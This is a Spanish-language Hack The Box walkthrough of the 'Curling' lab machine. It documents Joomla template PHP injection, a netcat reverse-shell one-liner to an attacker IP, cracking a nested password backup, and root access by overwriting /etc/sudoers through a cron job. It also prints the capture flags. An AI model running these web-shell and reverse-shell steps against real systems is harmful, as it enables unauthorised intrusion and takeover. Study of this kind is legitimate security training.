---
title: "Hack The Box - Curling"
excerpt: "<img src='/images/portfolio/curling/cover.webp' width='500' height=auto><br/><br/>Curling is an Easy difficulty Linux box which requires a fair amount of enumeration. The password is saved in a file on the web root. The username can be download through a post on the CMS which allows a login. Modifying the php template gives a shell. Finding a hex dump and reversing it gives a user shell. On enumerating running processes a cron is discovered which can be exploited for root."
collection: portfolio
---

NMAP
------

Utilizo la herramienta nmap para escaneo de puertos y servicios.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# nmap -A -PN 10.10.10.150
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-23 12:57 CET
    Nmap scan report for 10.10.10.150
    Host is up (0.042s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
    |   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
    |_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: Home
    |_http-generator: Joomla! - Open Source Content Management
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=1/23%OT=22%CT=1%CU=41059%PV=Y%DS=2%DC=T%G=Y%TM=65AF
    OS:A9A6%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)
    OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C
    OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
    OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
    OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
    OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
    OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
    OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
    OS:%CD=S)

    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE (using port 8080/tcp)
    HOP RTT      ADDRESS
    1   42.64 ms 10.10.14.1
    2   42.89 ms 10.10.10.150

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 22.51 seconds
    
HTTP
------

Conectándome al puerto http mediante el navegador me encuentro lo siguiente.<br/>

<img src='/images/portfolio/curling/http.png' width='900' height=auto><br/><br/>

Ahora voy a realizar una enumeración de directorios con 'gobuster' a ver si consigo algo.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# gobuster dir --url http://10.10.10.150/ --wordlist /usr/share/wordlists/dirb/common.txt
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.10.150/
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.hta                 (Status: 403) [Size: 277]
    /.htpasswd            (Status: 403) [Size: 277]
    /.htaccess            (Status: 403) [Size: 277]
    /administrator        (Status: 301) [Size: 320] [--> http://10.10.10.150/administrator/]
    /bin                  (Status: 301) [Size: 310] [--> http://10.10.10.150/bin/]
    /cache                (Status: 301) [Size: 312] [--> http://10.10.10.150/cache/]
    /components           (Status: 301) [Size: 317] [--> http://10.10.10.150/components/]
    /images               (Status: 301) [Size: 313] [--> http://10.10.10.150/images/]
    /includes             (Status: 301) [Size: 315] [--> http://10.10.10.150/includes/]
    /index.php            (Status: 200) [Size: 14264]
    /language             (Status: 301) [Size: 315] [--> http://10.10.10.150/language/]
    /layouts              (Status: 301) [Size: 314] [--> http://10.10.10.150/layouts/]
    /libraries            (Status: 301) [Size: 316] [--> http://10.10.10.150/libraries/]
    /media                (Status: 301) [Size: 312] [--> http://10.10.10.150/media/]
    /modules              (Status: 301) [Size: 314] [--> http://10.10.10.150/modules/]
    /plugins              (Status: 301) [Size: 314] [--> http://10.10.10.150/plugins/]
    /server-status        (Status: 403) [Size: 277]
    /templates            (Status: 301) [Size: 316] [--> http://10.10.10.150/templates/]
    /tmp                  (Status: 301) [Size: 310] [--> http://10.10.10.150/tmp/]
    Progress: 4614 / 4615 (99.98%)
    ===============================================================
    Finished
    ===============================================================

Lo que más me llama la atención es el directorio /administrator vamos a conectarnos a ver de que se trata.<br/>

<img src='/images/portfolio/curling/administrator.png' width='900' height=auto><br/><br/>

Se trata de una interfaz de autenticación. Podemos ver también que el servidor hace uso de la plataforma 'Joomla' (https://www.joomla.org/). Si trato de acceder con las credenciales predeterminadas de la plataforma, no obtengo ningún resultado. Por tanto, me va a tocar analizar en profundidad los directorios y ficheros en búsqueda de un hilo por el que tirar.<br/><br/>

Con ayuda de Burpsuite, al acceder código del 'index.html' de la dirección principal, obtuve lo siguiente.<br/>

<img src='/images/portfolio/curling/secrets.png' width='900' height=auto><br/><br/>

Se ve que hay un comentario con el texto 'secret.txt', voy a ver si en efecto existe un recurso con ese nombre.<br/>

<img src='/images/portfolio/curling/secret.png' width='900' height=auto><br/><br/>

Resulta que ese recurso alberga una cadena en base64 'Q3VybGluZzIwMTgh' voy a decodificarla a ver que es.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# echo "Q3VybGluZzIwMTgh" | base64 -d
    Curling2018!

Parece tratarse de una contraseña, si prueba a entrar a la ruta /administrator con las credenciales 'admin:Curling2018!' y similares no consigo acceder, lo que me hace pensar que esa contraseña tendré que usarla en otro lugar.<br/><br/>

Investigando la página principal, veo que también existe un formulario de login. Además en relación con un posible nombre de usuario, se puede ver algo muy interesante.<br/>

<img src='/images/portfolio/curling/floris.png' width='900' height=auto><br/><br/>

Parece que un posible usuario sea 'Floris'. Voy a probar a acceder con ese usuario y la contraseña que obtuve anteriormente.<br/>

<img src='/images/portfolio/curling/superuser.png' width='450' height=auto><br/><br/>

Joomla
------

Efectivamente esas eran las credenciales del Super User, ahora voy a probar estas mismas credenciales para acceder a la ruta /administrator.<br/>

<img src='/images/portfolio/curling/joomla.png' width='900' height=auto><br/><br/>

Consigo acceso como superusuario a la plataforma 'Joomla'. Buscando alguna forma de explotar esta plataforma para un posible reverse shell, encontré el siguiente artículo (https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce) el cual explica como se puede conseguir un RCE.<br/><br/>

Por tanto entré en Templates > Templates > Protostar Details and Files y elegí una plantilla para inyectar código. En mi caso elegí 'error.php' e inyecté la siguiente línea de código 'system($_REQUEST[​'pwn'​]);'.<br/>

<img src='/images/portfolio/curling/errorPHP.png' width='900' height=auto><br/><br/>

Para acceder a ese recurso necesitaré la siguiente dirección 'http://10.10.10.150/templates/protostar/error.php?pwn=id'. Cuando accedo puedo ver lo siguiente.<br/>

<img src='/images/portfolio/curling/pwnID.png' width='900' height=auto><br/><br/>

Ahora para obtener un reverse shell con el que pueda interactuar, lo hago de la siguiente manera.<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# curl http://10.10.10.150/templates/protostar/error.php -G --data-urlencode 'pwn=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.31 1234 > /tmp/f'

<br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# nc -lnvp 1234           
    Listening on 0.0.0.0 1234
    Connection received on 10.10.10.150 52310
    /bin/sh: 0: can't access tty; job control turned off
    $ whoami
    www-data
    $

Me queda intentar obtener el flag del usuario. Voy a ir a /home a ver que me encuentro.<br/>

    $ cd /home
    $ ls
    floris
    $ cd floris
    $ ls
    admin-area
    password_backup
    user.txt
    $ cat user.txt
    cat: user.txt: Permission denied
    $

Como se ha podido ver, no tengo permiso para abrir el fichero 'user.txt'. Sin embargo hay un fichero llamado 'password_backup' que puede ser interesante, voy a sacar el contenido a ver que es.<br/>

    $ cat password_backup
    00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
    00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
    00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
    00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
    00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
    00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
    00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
    00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
    00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
    00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
    000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
    000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
    000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
    000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
    000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
    000000f0: 819b bb48                                ...H

Parece tratase de un contenido en hexadecimal. Voy a decodificarlo a ver que obtengo.<br/>

    $ cd /tmp
    $ cp /home/floris/password_backup .
    $ ls
    f
    password_backup
    $ cat password_backup | xxd -r > bak
    $ file bak
    bak: bzip2 compressed data, block size = 900k
    $

Al decodificarlo, se obtiene un fichero en formato 'bzip2'. Voy a descomprimirlo a ver que saco.<br/>

    $ bzip2 -d bak
    bzip2: Can't guess original name for bak -- using bak.out                                                                                                    
    $ file bak.out
    bak.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix                                                            
    $ mv bak.out bak.gz
    $ gzip -d bak.gz
    $ file bak
    bak: bzip2 compressed data, block size = 900k
    $ bzip2 -d bak
    bzip2: Can't guess original name for bak -- using bak.out
    $ file bak.out
    bak.out: POSIX tar archive (GNU)
    $ tar xf bak.out
    $ ls
    bak.out
    f
    password.txt
    password_backup
    $ cat password.txt
    5d<wdCbdZu)|hChXll
    $

SSH
------

Tras una serie de descompresiones, obtengo lo que parece ser la contraseña del usuario con nombre 'floris'. Me voy a conectar a través de ssh con esas credenciales a ver si así, finalmente, puedo conseguir el flag de usuario. <br/>

    ┌──(root㉿kali)-[/home/nico/htb]
    └─# ssh floris@10.10.10.150
    floris@10.10.10.150's password: 
    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    System information as of Wed Jan 24 10:54:35 UTC 2024

    System load:  0.0               Processes:            179
    Usage of /:   62.3% of 3.87GB   Users logged in:      0
    Memory usage: 21%               IP address for ens33: 10.10.10.150
    Swap usage:   0%


    0 updates can be applied immediately.

    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.


    Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
    floris@curling:~$ ls
    admin-area  password_backup  user.txt
    floris@curling:~$ cat user.txt
    aa95098c3c19c00e6d6c2e6c90765564

Ya pude conseguir el flag de usuario. Ahora llega el momento del escalado de privilegios.

Escalado de privilegios
------

Algo interesante es el directorio 'admin-area' en la carpeta de floris. Vamos a ver que hay dentro.<br/>

    floris@curling:~/admin-area$ ls -lah
    total 28K
    drwxr-x--- 2 root   floris 4.0K Aug  2  2022 .
    drwxr-xr-x 6 floris floris 4.0K Jan 24 11:06 ..
    -rw-rw---- 1 root   floris   25 Jan 24 11:07 input
    -rw-rw---- 1 root   floris  14K Jan 24 11:07 report
    floris@curling:~/admin-area$ cat input
    url = "http://127.0.0.1"

Resulta que contiene dos ficheros, uno llamado 'input' y el otro llamado 'report', el input contiene una URL para la cual el report mostrará la salida. En el caso actual, input contiene la URL base y report contiene el HTML de la página inicial. Puedo utilizar este proceso a mi favor cambiando la URL del input a una dirección con contenido confidencial, voy a probar.<br/><br/>

Lo que voy a hacer va a ser, crearme un fichero 'sudoers' en mi máquina que contenga al usuario 'floris' y descargarlo en la víctima en el directorio /etc. Metiéndole el siguiente contenido al fichero 'input', se sobreescribirá el fichero 'sudoers' añadiendo a 'floris' como usuario root.<br/>

    url = "http://10.10.14.31/sudoers"
    output = "/etc/sudoers"
    user-agent = "nicgarc/1.0"

Una vez que guardo los cambios en el fichero 'input', automaticamente recibo un request de GET para el fichero 'sudoers' por parte de la víctima a mi máquina local como se puede ver a continuación.<br/>

    ┌──(root㉿kali)-[/home/nico/htb/www]
    └─# python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
    10.10.10.150 - - [24/Jan/2024 12:33:02] "GET /sudoers HTTP/1.1" 200 -

Ahora solo queda hacer 'sudo su -' y tendría acceso como root pudiendo obtener el flag del root.<br/>

    floris@curling:~/admin-area$ sudo su -
    root@curling:~# cd /root
    root@curling:~# ls
    default.txt  root.txt
    root@curling:~# cat root.txt 
    409a86484fab3e76d47337d94b8fb573